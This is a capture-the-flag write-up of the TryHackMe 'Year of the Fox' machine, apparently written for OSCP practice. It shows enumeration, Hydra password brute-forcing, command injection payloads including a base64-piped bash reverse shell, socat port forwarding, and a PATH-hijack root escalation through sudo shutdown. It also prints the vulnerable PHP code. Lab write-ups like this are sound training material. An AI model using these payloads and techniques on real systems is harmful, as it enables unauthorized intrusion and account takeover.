---
title: "Writeup TryHackMe: Year of the Fox \"HardBox\""
date: 2026-05-22 16:52:00 -0500
categories: [CTF, TryHackMe]
tags: [command_injection, linux_privilege_escalation, ctf]
image:
  path: /assets/img/yearofthefox/yearofthefox_main.webp
---

**Welcome Back, Hackers! 🦊**

Today, we are diving into **Year of the Fox**, a notoriously fun "Hard" rated machine from TryHackMe. I stumbled across this one while grinding out advanced modules to prep for my OSCP, and honestly, it quickly became one of my favorites. It’s got a bit of everything: sneaky web filters, port-forwarding shenanigans, and a privilege escalation vector that completely caught me off guard.

If you want to follow along and test your skills, grab your caffeine of choice and jump into the room right here:

[Year of the Fox Room TryHackMe](https://tryhackme.com/room/yotf){:target="_blank"}

I ended up enjoying this one a lot more than I expected.

It combines:

- SMB enumeration
- Web application testing
- Command injection
- Reverse shells
- Port forwarding
- SSH brute forcing
- A pretty unusual privilege escalation vector

In other words: the machine basically looked at me and said
> How many bad decisions can you chain together today?

Ready to break some things? Let's get into it...

## Reconnaissance
### Nmap

```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 10.66.140.200
Host is up (0.00013s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -20m01s, deviation: 34m38s, median: -1s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2026-05-22T22:59:33+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-22T21:59:33
|_  start_date: N/A
```
{: .nolineno }

We kickoff every engagement the exact same way—knocking on doors with a classic Nmap scan. The results showed 3 open ports:
- 80 (HTTP)
- 139 (NetBIOS)
- 445 (SMB)

**Initial thought:** Ah, ports 139 and 445 are exposed. SMB is alive and kicking!

Whenever SMB is wide open like this, my immediate reflex is to see if it’s leaking any juicy details about the host, users, or groups. To do the heavy lifting, I fired up `enum4linux`.

### Enum4linux

```bash
$ enum4linux 10.66.140.200
[SNIP]
 ========================================== 
|    Share Enumeration on 10.66.140.200    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.66.140.200
//10.66.140.200/yotf	Mapping: DENIED, Listing: N/A
//10.66.140.200/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

[SNIP]

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

```
{: .nolineno }

The output handed us three crucial pieces of the puzzle:

1. The target is running Linux Ubuntu (which Nmap had already hinted at).
2. There are two SMB shares active: `yotf` and the standard `IPC$`. Unfortunately, anonymous access was disabled (a quick check with NetExec confirmed we weren't getting in that easily).
```bash
nxc smb 10.66.140.200 -u '' -p '' --shares
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  [*] Unix - Samba (name:YEAR-OF-THE-FOX) (domain:lan) (signing:False) (SMBv1:True) 
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  [+] lan\: (Guest)
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  [*] Enumerated shares
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  Share           Permissions     Remark
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  -----           -----------     ------
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  yotf                            Fox's Stuff -- keep out!
SMB         10.66.140.200   445    YEAR-OF-THE-FOX  IPC$                            IPC Service (year-of-the-fox server (Samba, Ubuntu))
```
{: .nolineno }
3. We successfully enumerated two local usernames: `fox` and `rascal`.

With SMB locked down tighter than a security guard's lunchbox, I decided to pivot and check out what was running on the port 80 web server.

### Web Page

The moment I navigated to the website, I was greeted by a standard HTTP Basic Auth prompt blocking the path.

Normally, you'd look for a "Forgot Password" link or a hint, but the Nmap scan had already revealed the Basic Realm message:

*You want in? Gotta guess the password!*

Well, challenge accepted. We have two valid usernames (`fox` and `rascal`), and the author is practically whispering "Please brute-force me" in our ears.

![Basic auth page](/assets/img/yearofthefox/yearofthefox_1.webp)

I spun up two Hydra instances—one for each user—and let them rip against the login portal. After a few minutes of waiting and praying to the wordlist gods, Hydra successfully cracked the password for the user `rascal`. Not a bad start, right?

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.66.140.200 http-get /
[80][http-get] host: 10.66.140.200   login: rascal   password: quinton
```
{: .nolineno }

Logging in with Rascal’s credentials brought me to a bare-bones search interface featuring a single input field and a "SEARCH" button.

![Search page](/assets/img/yearofthefox/yearofthefox_2.webp)

To see what was going under the hood, I checked the page's source code and found two obfuscated JavaScript files: `filter.js` and `submit.js`. After rubbing my eyes and untangling the code, here is what they actually do:
- The Filter (`filter.js`): It listens for a keyup event on the input box. If you hit Enter, it triggers the submission. However, it strictly validates that your input only contains letters, numbers, periods, and spaces. If it catches a single "illegal" character, it deletes your entire input. (Talk about aggressive).
- The Submitter (`Submit.js`): This script sanitizes the input by stripping out anything that isn't alphanumeric, explicitly deletes the word "exec", and then ships it off via a POST request to /assets/php/search.php containing the JSON payload: {"target":"YOUR_INPUT"}.

## Web Explotation

> Always route your web traffic through an intercepting proxy like Burp Suite, OWASP ZAP, or Caido. It is infinitely easier to manipulate data when you can bypass annoying client-side JavaScript restrictions completely.
{: .prompt-tip }

I captured the POST request to search.php and threw it into Burp Repeater to see how the backend handled raw data.

![Burp Suite Request Search](/assets/img/yearofthefox/yearofthefox_3.webp)

I started poking at the "target" parameter and noticed a few interesting quirks:
- Sending an empty string caused the endpoint to spit back a list of every single file in the directory.
- Sending a partial filename like "cred" made the backend return the full filename "creds2.txt".

This strongly sounds like a Command Injection vulnerability. It looked like the backend was passing our input straight into a shell command using wildcards, likely looking something like this:

```bash
find /some/folder -name "*USER_INPUT*"
```
{: .nolineno }

To figure out what characters were being filtered by the PHP backend, I sent a checklist of special characters.

```bash
;
|
`
'
"
(
)
{
}
[
]
<
>
\
/
:
*
?
~
=
+
-
%
%0a
```
{: .nolineno }

![Burp Suite Request Invalid Character](/assets/img/yearofthefox/yearofthefox_4.webp)

The API instantly returned "Invalid Character" whenever I tried using `&` or `$`. However, these characters passed through without a hitch and triggered a full file listing:

```bash
"
\
*
?
```
{: .nolineno }

If my theory about the backend command execution was right, I needed to safely exit the developer's query string to execute my own commands.
1. First, I needed to close the developer's opening double quote. Since we are dealing with a JSON payload, remember you have to escape internal quotes using a backslash (\").
2. Next, I added a semicolon (;) to tell the Linux shell: "Hey, that command is done, look at this shiny new one right here."

> If you just inject your command and stop there, the original closing quote from the backend script will append to the end of your command and cause a syntax error. I spent over an hour tearing my hair out trying to figure out why my syntax was breaking before I realized this.
{: .prompt-warning }

The fix? Treat it like a SQL injection! You just have to add a shell comment character to comment out the rest of the backend's original command.

To test if I actually had Remote Code Execution (RCE), I decided to make the target machine ping my local Kali Linux box. On my attacker machine, I spun up tcpdump to listen for incoming ICMP packets:

```bash
$ sudo tcpdump -i tun0 icmp
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
{: .nolineno }

Our final payload looked like this:

```json
{"target":"\"; ping -c 1 IP_KALI; #"}
```
{: .nolineno }

I hit send in Burp, checked my terminal, and... Boom! ICMP packets started flooding my tcpdump screen. We have RCE, ladies and gentlemen!

```bash
15:43:55.276265 IP 10.66.140.200 > IP_KALI: ICMP echo request, id 1067, seq 1, length 64
15:43:55.276288 IP IP_KALI > 10.66.140.200: ICMP echo reply, id 1067, seq 1, length 64
```
{: .nolineno }

## Gaining a Foothold

Now that we can execute commands, it's time to catch a reverse shell. Because the backend filters out several characters, trying to pass a raw bash shell can be a massive headache. The cleanest workaround is to encode your reverse shell payload into Base64 and tell the target to decode and execute it on the fly:

```json
{"target":"\"; echo BASE64_CODE | base64 -d | bash 2>/dev/null; #"}
```
{: .nolineno }

I set up my trusty shell handler, Penelope, and she instantly caught the connection and automatically upgraded it to a stable, beautiful TTY shell.

> If you are prepping for the OSCP, definitely check out Penelope. It handles shell stabilization seamlessly.
{: .prompt-info }

We successfully landed on the box as `www-data`. Not root... yet.

Popping open the `search.php` file in the web directory confirmed all of our theories about the backend logic and character filtering.

```php
<?php
        if($_SERVER["REQUEST_METHOD"] != "POST"){
                echo "Uh oh, something went wrong!";
        } else {
                $target = json_decode(file_get_contents("php://input"));
                if (strpos($target->target, "&") !== false || strpos($target->target, "$") !==false){
                        echo json_encode(["Invalid Character"]);
                        exit();
                }
                $query = exec("find ../../../files/* -iname \"*$target->target*\" | xargs");
                if (strlen($query) < 1){
                        echo json_encode(["No file returned"]);
                } else{
                        $queryArr = explode(" ", $query);
                        foreach($queryArr as $key => $tmp){
                                $queryArr[$key] = str_replace("../../../files/", "", $tmp);
                        }
                        echo json_encode($queryArr);
                }
        }
?>
```
{: file="/var/www/html/assets/php/search.php" }

I also grabbed the web-flag while I was there.

```bash
www-data@year-of-the-fox:/var/www/html/assets/php$ cd ../../../
www-data@year-of-the-fox:/var/www$ ls -al
total 20
drwxr-xr-x  4 root root 4096 May 31  2020 .
drwxr-xr-x 13 root root 4096 May 30  2020 ..
drwxr-xr-x  2 root root 4096 May 31  2020 files
drwxr-xr-x  3 root root 4096 May 31  2020 html
-rw-r--r--  1 root root   38 May 31  2020 web-flag.txt
```
{: .nolineno }

> You'll see a folder named files containing files like `creds` or `important`. Don't waste your time digging through them. They are pure rabbit holes meant to eat your time. Ask me how I know...
{: .prompt-warning }

## Lateral Movement

Time for some internal enumeration. I checked for basic SUID misconfigurations, cronjobs, and sudo rights, but nothing stood out immediately. However, checking network connections revealed something bizarre: Port 22 (SSH) was active, but it was strictly listening on localhost (127.0.0.1).

```bash
www-data@year-of-the-fox:/tmp$ (netstat -punta || ss --ntpu) | grep "127.0"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```
{: .nolineno }

Why on earth would someone configure SSH to only be accessible internally? Unless... it was completely intentional to keep us guessing.

To attack this internal port, we have two options:
1. Upload brute-forcing tools (like static binaries of Hydra/Medusa) directly to the target.
2. Forward the internal port back to our Kali machine and use our local arsenal.

I went with Option 2. Hunting down or compiling static binaries can be tedious, and writing custom python/bash brute-forcers without external libraries is no fun.

I uploaded a static binary of `socat` to the target machine and ran a quick port-forwarding command to map the target's internal port 22 over to port 2222 on my Kali machine.

```bash
www-data@year-of-the-fox:/tmp$ ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22 &
[1] 29994
```
{: .nolineno }

Now we can target SSH locally! But who are we targeting? I tried Rascal's web password, but no luck. Luckily, we still had that other username from our earlier SMB enumeration: `fox`.

To verify if Fox could even log in, I checked the SSH configuration file `/etc/ssh/sshd_config` for an AllowUsers directive:

```bash
www-data@year-of-the-fox:/tmp$ cat /etc/ssh/sshd_config | grep User
#AuthorizedKeysCommandUser nobody
#IgnoreUserKnownHosts no
#PermitUserEnvironment no
#Match User anoncvs
AllowUsers fox
```
{: .nolineno }

Bingo. Fox is the only user permitted to log in via SSH. I pointed Hydra directly at my local forwarded port 2222 and let it run against the `fox` user. Within a few short minutes, Hydra handed me Fox's cleartext password. Beautiful.

```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 2222 10.66.140.200 ssh
[2222][ssh] host: 10.66.140.200   login: fox   password: 0123456789
```
{: .nolineno }

> Remember to configure Hydra to port 2222
{: .prompt-tip }

## Privilege Escalation

Logging in as `fox` via SSH felt great, but the ultimate goal is always root. I immediately checked Fox's sudo privileges using `sudo -l`:

```bash
fox@year-of-the-fox:/home$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```
{: .nolineno }

Wait... `/sbin/shutdown`?

Initially, I laughed. I thought the creator of the room was just pulling a prank, giving us permission to turn off the machine as a joke. But in cybersecurity, you never assume. I hopped onto Google to see if there was a known escalation vector for the shutdown binary.

To my absolute shock, there was. Because of how `shutdown` handles power states and interacts with specific system binaries, you can hijack the execution flow to spawn a root shell.

This article provides a very clear step-by-step guide to the operation:

[Shutdown Privilege Escalation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation){:target="_blank"}

Following the exploitation steps, I executed the sequence, pressed Enter, and...

```bash
fox@year-of-the-fox:/home$ echo /bin/bash > /tmp/poweroff
fox@year-of-the-fox:/home$ chmod +x /tmp/poweroff
fox@year-of-the-fox:/home$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/home$ sudo /usr/sbin/shutdown
root@year-of-the-fox:/home# whoami
root
root@year-of-the-fox:/home# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

We are ROOT! That feeling never gets old.

## Cleaning Up and The Final Flag

I marched right into the `/root` directory expecting my final reward, only to find the user flag sitting there instead. The room creator struck again with another practical joke!

Remembering our initial enumeration, there were two user directories in /home: `fox` and `rascal`. As the fox user, we didn't have permission to peek inside Rascal's home folder.

```bash
total 16
drwxr-xr-x  4 root   root   4096 May 28  2020 .
drwxr-xr-x 22 root   root   4096 May 29  2020 ..
drwxr-x---  5 fox    fox    4096 Jun 20  2020 fox
drwxr-x---  2 rascal rascal 4096 Jun  1  2020 rascal
fox@year-of-the-fox:/home$ cd rascal/
-bash: cd: rascal/: Permission denied
```
{: .nolineno }

But now that we are root, nothing stands in our way. I listed the contents of `/home/rascal/`, and safely tucked away inside was the genuine root flag.

```bash
root@year-of-the-fox:~# ls
samba  user-flag.txt
root@year-of-the-fox:~# ls -al /home/rascal/
total 24
drwxr-x--- 2 rascal rascal 4096 Jun  1  2020 .
drwxr-xr-x 4 root   root   4096 May 28  2020 ..
lrwxrwxrwx 1 root   root      9 May 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rascal rascal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 rascal rascal 3771 Apr  4  2018 .bashrc
-r-------- 1 rascal root    158 Jun  9  2020 .did-you-think-I-was-useless.root
-rw-r--r-- 1 rascal rascal  807 Apr  4  2018 .profile
```
{: .nolineno }

## Final Thoughts

This room was an absolute blast. It perfectly strings together realistic concepts: bypassing client-side validation, pivoting through restricted internal ports, and researching unusual binary permissions to get root.

If you enjoyed this write-up, leave a comment below or share it with your fellow OSCP grinders.

Until next time, happy hacking! 💻🦊
